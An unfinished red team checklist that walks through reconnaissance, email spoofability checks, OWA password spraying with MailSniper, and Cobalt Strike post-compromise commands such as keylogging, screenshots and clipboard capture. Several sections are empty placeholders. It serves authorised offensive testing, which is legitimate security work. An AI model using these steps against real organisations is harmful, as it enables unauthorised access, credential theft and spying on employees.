# Red Team Checklist



## Setting up Infrastructure&#x20;

### Phishing



### Command & Control (C2)



## External Reconnaissance & Enumeration

### Google Dorking

Google dorking is an incredibly powerful and simple method of finding more information about a target.

* [ ] [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) - Hundreds of dorking examples.
* ```jsdoc
  site:  Limit the search results to those from a specific website.
  site:apple.com
  ```
* ```json
  intitle:  Find pages with a certain word in the title.
  intitle:apple
  ```
* ```json
  inurl:  Find pages with a certain word in the URL.
  inurl:apple
  ```
* ```json
  intext:  Find pages containing a certain word (or words) somewhere in the content.
  intext:apple
  ```
* ```json
  filetype:  Search for filetypes that Google understands.
  site:apple.com filetype:pdf
  ```
* ```json
  #..#:  Search for a range of numbers.
  site:apple.com filetype:pdf 2020..2022
  ```
* ```json
  -:  Exclude a phrase.
  site:apple.com -www -support
  This will return pages indexed on apple.com excluding the www and support domains.  
  Useful for finding other subdomains.
  ```

### Social Media

Social Media is an invaluable resource for finding information. A red team should have accounts on all major social media platforms, LinkedIn premium is a must have. Wise choice to always create a burner for every engagement. Here are some things to find in social media:

* [ ] High value targets (I.T, Software Engineers, Help Desk, employees with high privilege access).
* [ ] Gather both professional and personal information Must have pre-text to craft a successful phish.
* [ ] [hunter.io](https://hunter.io/) (canary tokens tho :eyes:)

### Web Servers

* ```shell-session
  $ dig rotta.dev
  ;; ANSWER SECTION:
  rotta.dev.		3600	IN	A	76.223.105.230
  rotta.dev.		3600	IN	A	13.248.243.5
  ```
* ```shell-session
  $ whois rotta.dev

  OrgName:        Amazon.com, Inc.
  OrgId:          AMAZO-4
  Address:        Amazon Web Services, Inc.
  Address:        P.O. Box 81226
  City:           Seattle
  StateProv:      WA
  PostalCode:     98108-1226
  Country:        US
  RegDate:        2005-09-29
  Updated:        2022-09-30
  Comment:        For details of this service please see
  Comment:        http://ec2.amazonaws.com
  Ref:            https://rdap.arin.net/registry/entity/AMAZO-4
  ```
* ```shell-session
  $ ~/dnscan$ ./dnscan.py -d rotta.dev -w subdomains-100.txt

  [*] Scanning rotta.dev for A records
  76.223.105.230 - www.rotta.dev
  199.32.90.122 - mail.rotta.dev

  (Alteratively, we can use crt.sh or the like to do this. However, DNSscan resolves
  IP addresses, which is incredibly powerful to determine if a subdomain is hosted
  on a separate / or possibly internal server.)
  ```

### Email Security

Weak email security (SPF, DMARC and DKIM) may allow us to spoof emails to appear as though they’re coming from their own domain.

* <pre class="language-shell-session"><code class="lang-shell-session">$ ~/Spoofy$ pip3 install -r requirements.txt
  <strong>$ ~/Spoofy$ python3 spoofy.py -d rotta.dev -o stdout
  </strong><strong>
  </strong>[*] Domain: rotta.dev
  [*] Is subdomain: False
  [*] DNS Server: 1.1.1.1
  [?] No SPF record found.
  [?] No DMARC record found.
  [+] Spoofing possible for rotta.dev
  </code></pre>



### Office 365





### People

(TODO Include Mindmap screenshot here or organization).

## Initial Compromise

### OWA Password Spraying

Far from the best method of gaining access these days. All eyes are you from the SOC when performing these attacks. That said, password spraying incidents cause massive bloat in alerts for blue team. Some orgs may decide to exclude this activity entirely as they have measures in place to mitigate activity. Account lockouts, Conditional Access Policy (CAP), etc.

#### Generate username wordlist

There are many wordlist generators out there for usernames. Will not name them.

* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ~/namemash.py users.txt > usernames.txt
  </strong></code></pre>

#### Determine valid domain

Choosing a tool comes down to preference, we'll use [MailSniper](https://github.com/dafthack/MailSniper) to determine a valid domain for OWA.

* <pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\PaulBlart\> ipmo C:\Tools\MailSniper\MailSniper.ps1
  </strong><strong>
  </strong>PS C:\Users\PaulBlart> Invoke-DomainHarvestOWA -ExchHostname mail.rotta.dev
  [*] Harvesting domain name from the server at mail.rotta.dev
  The domain appears to be: CYBER or rotta.dev
  </code></pre>

#### Find Valid Usernames Password

Authentications on valid usernames take a little longer to process then invalid usernames, from this we can determine if a username in our wordlist is valid or is invalid.

* ```powershell
  PS C:\Users\PaulBlart> Invoke-UsernameHarvestOWA -ExchHostname mail.rotta.dev -Domain rotta.dev -UserList .\Desktop\usernames.txt 
  -OutFile .\Desktop\valid_usernames.txt

  [*] Now spraying the OWA portal at https://199.32.90.122/owa/
  ```

#### Spray Passwords

If we decide to do this attack, it's best to take our time with this (depending on engagement timeframe). We are unable as red-teamers to determine account lockout configurations without access to the domain.

* [ ] `Patterns such as`` `**`MonthYear`**` ``(August2019),`` `**`SeasonYear`**` ``(Summer2019) and`` `**`DayDate`**` ``(Tuesday6)`
* ```powershell
  PS C:\Users\PaulBlart> Invoke-PasswordSprayOWA -ExchHostname mail.rotta.dev -UserList 
  .\Desktop\valid_usernames.txt -Password FoxyLady123!
  ```



## Post Compromise - Enumeration & Reconnaissance

### Harvested O365 Credentials

#### Download Global Address List

Download global email address list with MailSniper.

* ```powershell
  PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.rotta.dev 
  -UserName rotta.dev\cassy -Password FoxyLady123! -OutFile .\Desktop\gal.txt
  ```

### Host Recon - Cobalt Strike

#### List Processes

* ```powershell
  beacon> ps
  ```

#### List Tasks

* ```powershell
  beacon> ps
  ```

#### Seatbelt

* ```powershell
  beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt.exe -group=system
  ```

#### Keylogger

* ```powershell
  beacon> keylogger
  [+] received keystrokes from *Untitled - Notepad by nancy

  beacon> jobs
  [*] Jobs

   JID  PID   Description
   ---  ---   -----------
   1    0     keystroke logger

  beacon> jobkill 1
  ```

#### Screenshots

* ```powershell
  printscreen               Take a single screenshot via PrintScr method
  screenshot                Take a single screenshot
  screenwatch               Take periodic screenshots of desktop
  ```

#### Clipboard

* ```
  beacon> clipboard
  ```

#### User Sessions

* ```powershell
  beacon> net logons

  Logged on users at \\localhost:

  DEV\nancy
  DEV\cassy
  DEV\PWNBOX$
  ```



### Windows Registries



### Tasks





### Processes





### Hunting for COM Hijacking







## Post Compromise - Host Privilege Escalation

TODO Add this&#x20;

### Windows Services

##

## Post Compromise - Persistence

### Persistence - SharPersist & Cobalt Strike

#### Task Scheduler



#### AutoRun Registry





## Post Compromise - Elevated SYSTEM Persistence

TODO Add this

### Windows Services





##

## Post Compromise - Phishing & Lateral Movement

### Internal Phishing

TODO Add Teams, Slack, OneDrive, and others.



### Initial Access Payloads



### VBA Macros

### Remote template Injection

### HTML Smuggling



## Post Compromise - Credential Theft





&#x20;

